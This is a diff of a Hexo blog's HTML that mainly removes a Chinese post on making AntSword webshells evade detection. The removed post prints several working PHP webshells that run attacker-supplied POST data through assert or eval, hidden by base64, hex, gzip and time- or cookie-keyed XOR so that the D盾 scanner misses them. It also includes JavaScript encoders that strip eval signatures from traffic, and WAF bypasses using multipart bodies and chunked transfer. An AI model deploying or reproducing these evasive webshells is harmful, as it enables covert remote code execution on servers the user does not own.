-<p>我们新建一个编码器对发送的数据进行处理，编码器里面有个默认的实例，是base64的编码器，就是我们上面图中发送数据使用的编码器，我们学习下是怎么处理的。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728092809554.png" alt="image-20200728092809554"></p>
-<p>作者也非常贴心的把注释写的非常清楚，首先是生成一个14位长度的随机值当作参数名，然后把我们需要传递的内容base64编码进行赋值，然后在pwd中传入代码执行的代码。</p>
-<p>首先看下变量长度的问题如何解决，可以通过随机生成一个长度字段，再去根据长度去随机生成相应的内容，这样就可以确保每次发起请求的参数长度是变化的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let num &#x3D;  Math.floor(Math.random()*15);</span><br><span class="line">let randomID &#x3D; &#96;_0x$&#123;Math.random().toString(16).substr(num)&#125;&#96;;</span><br></pre></td></tr></table></figure>
-
-<p>这样我们发送的参数名的长度就是变化的了。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728102211355.png" alt="image-20200728102211355"></p>
-<p>但是我们仍然有一个核心的问题没有解决，就是在我们发送的流量里面会有eval，这个如何解决呢？</p>
-<h5 id="特征三：eval特征处理"><a href="#特征三：eval特征处理" class="headerlink" title="特征三：eval特征处理"></a>特征三：eval特征处理</h5><p>我参考了蚁剑作者关于这部分处理的文章，他是将eval这部分进行了编码，如果直接对eval进行编码，那在服务端是无法识别这个流量的，因此服务端也需要对这个数据进行base64解码，使用这种方法需要稍微改变一下服务端的代码。</p>
-<p>首先修改一下编码器的代码，将eval部分的代码base64编码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[pwd] &#x3D; Buffer.from(&#96;eval(base64_decode($_POST[$&#123;randomID&#125;]));&#96;).toString(&#39;base64&#39;);</span><br></pre></td></tr></table></figure>
-
-<p>然后在修改下我们的shell，让其在接收参数的时候进行base64解码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$c&#x3D;base64_decode($_POST[&#39;ant&#39;]);</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($c));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>然后再抓包看下流量，已经没有eval的特征了</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728104852973.png" alt="image-20200728104852973"></p>
-<p>其实同理，我们既然可以base64,为什么不能hex呢？</p>
-<p>这个我就不讲了，如果理解了base64，那么这个也非常容易</p>
-<p><strong>编码器</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * php::base64编码器</span><br><span class="line"> * Create at: 2020&#x2F;07&#x2F;28 10:16:51</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*&#x2F;</span><br><span class="line">module.exports &#x3D; (pwd, data, ext&#x3D;&#123;&#125;) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">  &#x2F;&#x2F; 以下代码为 PHP Base64 样例</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F; 生成一个随机变量名</span><br><span class="line">  let num &#x3D;  Math.floor(Math.random()*15);</span><br><span class="line">  let randomID &#x3D; &#96;_0x$&#123;Math.random().toString(16).substr(num)&#125;&#96;;</span><br><span class="line">  &#x2F;&#x2F; 原有的 payload 在 data[&#39;_&#39;]中</span><br><span class="line">  &#x2F;&#x2F; 取出来之后，转为 base64 编码并放入 randomID key 下</span><br><span class="line">  data[randomID] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;hex&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span><br><span class="line">  data[pwd] &#x3D; Buffer.from(&#96;eval(Hex2String($_POST[$&#123;randomID&#125;]));&#96;).toString(&#39;hex&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ##########    请在上方编写你自己的代码   ###################</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 删除 _ 原有的payload</span><br><span class="line">  delete data[&#39;_&#39;];</span><br><span class="line">  &#x2F;&#x2F; 返回编码器处理后的 payload 数组</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>shell</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function Hex2String($hex)&#123;</span><br><span class="line">    $string&#x3D;&#39;&#39;;</span><br><span class="line">    for ($i&#x3D;0; $i &lt; strlen($hex)-1; $i+&#x3D;2)&#123;</span><br><span class="line">        $string .&#x3D; chr(hexdec($hex[$i].$hex[$i+1]));</span><br><span class="line">    &#125;</span><br><span class="line">    echo $string;</span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$c&#x3D;Hex2String($_POST[&#39;ant&#39;]);</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($c));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>最后效果如下;</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728105845603.png" alt="image-20200728105845603"></p>
-<p>这种简单的编解码处理可能防护设备也会自己解码，我们可以使用各种加密，或者自己写一个简单的算法对数据进行处理，甚至使用多种编解码+加密方式混合处理。</p>
-<h5 id="特征四：返回包格式"><a href="#特征四：返回包格式" class="headerlink" title="特征四：返回包格式"></a>特征四：返回包格式</h5><p>我这里查看了下蚁剑处理返回包的模板，发现其实蚁剑对返回包的分隔符的长度是随机生成的，代码在source/core/php/index.js中</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728111846522.png" alt="image-20200728111846522"></p>
-<p>所以在返回包处理这部分，我们更应该关注的不是返回包格式的问题，而是返回的明文内容的问题，这些特征都是特别明显的。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728112128155.png" alt="image-20200728112128155"></p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728112144427.png" alt="image-20200728112144427"></p>
-<p>这里蚁剑本身就提供了一些解码器使用，比如base64解码，只要我们在使用的时候选择解码器就行了，不用我们在shell里面添加解码功能。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134220904.png" alt="image-20200728134220904"></p>
-<p>使用效果如下：</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134243030.png" alt="image-20200728134243030"></p>
-<p>我们再看下我们发送的数据是怎么样的，如下图所示，就是我们发送的数据包中让其在输出的时候做了一个base64的编码</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134401588.png" alt="image-20200728134401588"></p>
-<p>同理，蚁剑还提供了rot13的解码器，使用效果如下：</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134524436.png" alt="image-20200728134524436"></p>
-<h5 id="特征五：custom-shell的特性"><a href="#特征五：custom-shell的特性" class="headerlink" title="特征五：custom shell的特性"></a>特征五：custom shell的特性</h5><p>首先我们使用一个custom模式的shell，然后抓包看下返回包,有没有看到一个非常明显的特征。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728152948041.png" alt="image-20200728152948041"></p>
-<p>对的，如你所见，这个特征就是-&gt;|和|&lt;-，正常的数据包中基本不会出现这个，因此这个也会被当作是蚁剑的特征。因为这边我们只传入了一个A，因此返回的处理逻辑肯定是写在custom的shell里的，我在shell中找到了对应的代码，但是直接删除后发现蚁剑不能正常工作了，也就是如果要删除这个东西会影响蚁剑对返回包的解析，因此可能需要修改蚁剑处理custom模式返回包部分的代码。在蚁剑的source/core/custom/index.js中，我找到了对应的代码位置。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728153806619.png" alt="image-20200728153806619"></p>
-<p>所以我们只要对这部分进行修改就可以了，我们要确保这个符号不会在返回包的内容中出现，我这里随便取了个@#来作为分割符。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154120506.png" alt="image-20200728154120506"></p>
-<p>同样，我们要在蚁剑的custom shell中进行相应的修改。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154150241.png" alt="image-20200728154150241"></p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154202049.png" alt="image-20200728154202049"></p>
-<p>然后就可以正常的使用了</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154219306.png" alt="image-20200728154219306"></p>
-<p>关于custom模式，还有第二个特性，就是关于传入的参数的参数名，z0,z1,z2等等，这个也算一个特征把，所以我们也需要把它处理一下，这个同样需要在shell和蚁剑同时处理，我在php的custom shell中找到了如下代码</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728160653504.png" alt="image-20200728160653504"></p>
-<p>所以我们需要把这几个参数改成比较正常的参数名。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728162411446.png" alt="image-20200728162411446"></p>
-<p>然后需要在蚁剑中找到这部分代码进行处理，这个处理就比较麻烦些，因为在好几个文件中都出现了。然后我分别在如下的几个文件中做了处理。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source\core\custom\template\database\default.js</span><br><span class="line">source\core\custom\template\command.js</span><br><span class="line">source\core\custom\template\filemanager.js</span><br></pre></td></tr></table></figure>
-
-<p>处理后效果如下：</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728162553173.png" alt="image-20200728162553173"></p>
-<h4 id="流量免杀"><a href="#流量免杀" class="headerlink" title="流量免杀"></a>流量免杀</h4><p>最后我们来学学流量混淆这部分，其实这里一方面是运用各种加密解密来对流量进行混淆，另一方面就是使用一些蚁剑本身提供的特性来进行混淆。</p>
-<h5 id="方法一：更改post的格式为Multipart"><a href="#方法一：更改post的格式为Multipart" class="headerlink" title="方法一：更改post的格式为Multipart"></a>方法一：更改post的格式为Multipart</h5><p>我们如果之前简单了解过一些绕WAF的技巧，我们就知道有些WAF针对于不同的请求类型的拦截规则是不一样的，大多数的WAF会对GET类型的请求拦截非常严格，但是对于POST会弱一些，有时候假如我们改变了请求体的方式为Multipart，有些WAF甚至只会检测文件上传漏洞，所以呢，可以通过这个特性来进行简单的绕过。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728155455601.png" alt="image-20200728155455601"></p>
-<p>设置后的效果如下：</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728155629444.png" alt="image-20200728155629444"></p>
-<h5 id="方法二：分块传输"><a href="#方法二：分块传输" class="headerlink" title="方法二：分块传输"></a>方法二：分块传输</h5><p>之前别人公开了分块传输绕WAF的方法后，后来做项目中遇到不少WAF都可以直接通过分块传输绕过。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728155810488.png" alt="image-20200728155810488"></p>
-<p>这里我设置好并刷新了下缓存，然后在burp上查看发包的这个过程，比较奇怪的是并没有发现分块传输的迹象。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728160222681.png" alt="image-20200728160222681"></p>
-<p>不过有老哥已经写了burp的分块传输的插件，我们可以将蚁剑的流量代理到burp上，再使用分块插件进行分块，嗯，真香。</p>
-<p>蚁剑中设置：</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728163023441.png" alt="image-20200728163023441"></p>
-<p>burp插件中设置：</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728163044919.png" alt="image-20200728163044919"></p>
-<p>然后就可以分块了。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728163127083.png" alt="image-20200728163127083"></p>
-<h5 id="方法三：各种编码解码器"><a href="#方法三：各种编码解码器" class="headerlink" title="方法三：各种编码解码器"></a>方法三：各种编码解码器</h5><p>蚁剑作者给了很多编解码器，地址：<a href="https://github.com/AntSwordProject/AwesomeEncoder" target="_blank" rel="noopener">https://github.com/AntSwordProject/AwesomeEncoder</a></p>
-<p><strong>zlib</strong></p>
-<p>在这个编码器里面也有关于如何去处理shell的提示</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728165427727.png" alt="image-20200728165427727"></p>
-<p>我将之前测试免杀D盾的shell稍微改了一下就可以了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$c&#x3D;$_POST[&#39;ant&#39;];</span><br><span class="line">$d&#x3D;base64_decode($c);</span><br><span class="line">$e&#x3D;gzinflate($d);</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($e));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>最后效果如下:</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728165614745.png" alt="image-20200728165614745"></p>
-<p><strong>动态密钥</strong></p>
-<p>因为之前有人分析冰蝎的加密，得出可以通过获取密钥的那个数据包来对冰蝎的指纹进行识别，所以yzddmr6前辈为了写了两款关于动态密钥的编码器，一个是基于时间生成密钥的，还有一个是通过随机cookie来生成的，我们都学习一下吧。</p>
-<p><strong>基于时间的动态密钥</strong></p>
-<p>我们跟着代码稍微学习一下，下面这段代码是比较简单和，和蚁剑自带的编码器代码没有什么区别，主要的操作在xor函数里。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174216362.png" alt="image-20200728174216362"></p>
-<p>跟进到xor函数里，函数里获取了当前的时间，并调用switch对时间的格式进行处理，switch这个函数是自定义的处理函数。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174601774.png" alt="image-20200728174601774"></p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174701365.png" alt="image-20200728174701365"></p>
-<p>使用格式化后的time的md5值作为key,对payload进行异或处理。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174910075.png" alt="image-20200728174910075"></p>
-<p>要使用这个编码器我们需要对我们的shell做一定的处理，需要在shell中加入解密的逻辑代码。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">date_default_timezone_set(&quot;PRC&quot;);</span><br><span class="line">@$post&#x3D;base64_decode($_REQUEST[&#39;yzddmr6&#39;]);</span><br><span class="line">$key&#x3D;md5(date(&quot;Y-m-d H:i&quot;,time()));</span><br><span class="line">for($i&#x3D;0;$i&lt;strlen($post);$i++)&#123;</span><br><span class="line">    $post[$i] &#x3D; $post[$i] ^ $key[$i%32];</span><br><span class="line">&#125;</span><br><span class="line">eval($post);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>最后数据包是这样的</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728175747960.png" alt="image-20200728175747960"></p>
-<p>base64解码后也是看不到明文内容的</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728175815387.png" alt="image-20200728175815387"></p>
-<p><strong>基于cookie的动态密钥</strong></p>
-<p>这种方法生成26位的随机字符放在了cookie的PHPSESSID中，设置方法基于时间的差不多，最后效果如下：</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728180915972.png" alt="image-20200728180915972"></p>
-<p>这里yzddmr6前辈还给出了一个免杀的shell，我们分析下这个shell为什么就能免杀D盾</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Cookie</span><br><span class="line">&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $key&#x3D;@$_COOKIE[&#39;PHPSESSID&#39;];</span><br><span class="line">        @$post&#x3D;base64_decode($_REQUEST[&#39;test&#39;]);</span><br><span class="line">        for($i&#x3D;0;$i&lt;strlen($post);$i++)&#123;</span><br><span class="line">            $post[$i] &#x3D; $post[$i] ^ $key[$i%26];</span><br><span class="line">        &#125;</span><br><span class="line">        return $post;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;return @eval($this-&gt;__construct());&#125;</span><br><span class="line">&#125;</span><br><span class="line">$check&#x3D;new Cookie();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>我基本把代码都删完了，发现当仅仅留下下面这段代码的时候D盾是会爆1级的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;return @eval($this-&gt;__construct());&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728181601624.png" alt="image-20200728181601624"></p>
-<p>然后前面加个函数名就不会杀了。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728181726799.png" alt="image-20200728181726799"></p>
-<p>而且当直接调用eval($this)会升到4级，但是使用$this-&gt;__construct()这种形式就少了很多。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728181848146.png" alt="image-20200728181848146"></p>
-<p>再测试了下，当参数中有-&gt;等级会下降很多，再加上参数+括号就不报了。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728182041283.png" alt="image-20200728182041283"></p>
-<p><strong><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728182102746.png" alt="image-20200728182102746"></strong></p>
-<p>所以对于其他敏感函数的拦截我们是不是也可以通过这种调用的方式绕过D盾的拦截。</p>
-<p>我使用assert再进行了测试，直接这样绕是会爆一级的，但是在这个代码前加上其他函数就不杀了，所以我们又学到一个小技巧，就是可以把我们代码执行的函数放在其他函数的后面。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728182629591.png" alt="image-20200728182629591"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过对蚁剑免杀的学习，终于明白为什么我的shell总会被杀了，所以深入了解一个工具是非常有必要的。</p>
-<p>参考文章：</p>
-<p><a href="https://yzddmr6.tk/posts/antsword-xor-encoder-2/" target="_blank" rel="noopener">基于随机Cookie的蚁剑动态秘钥编码器</a></p>
-<p><a href="https://yzddmr6.tk/posts/antsword-xor-encoder/" target="_blank" rel="noopener">蚁剑实现动态秘钥编码器解码器</a></p>
-<p><a href="https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&mid=2247483852&idx=1&sn=3cd3f667523550d414fad97231eeeaea&chksm=e91c5a34de6bd3223f5c3e69aa12311be39d4c13ee8d222ddb81f97070c74698dc7ae7fcecba&mpshare=1&scene=23&srcid&sharer_sharetime=1572778022447&sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rd" target="_blank" rel="noopener">蚁剑绕WAF进化图鉴</a></p>
-<p><a href="https://xz.aliyun.com/t/4000#toc-4" target="_blank" rel="noopener">从静态到动态打造一款免杀的antSword(蚁剑)</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
     <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1843,10 +1708,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2020-02-12 13:57:24 / Modified: 23:24:40" itemprop="dateCreated datePublished" datetime="2020-02-12T13:57:24+08:00">2020-02-12</time>
+              <time title="Created: 2020-02-12 13:57:24" itemprop="dateCreated datePublished" datetime="2020-02-12T13:57:24+08:00">2020-02-12</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-02 19:49:48" itemprop="dateModified" datetime="2020-09-02T19:49:48+08:00">2020-09-02</time>
+              </span>
 
           
 
@@ -1995,14 +1866,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
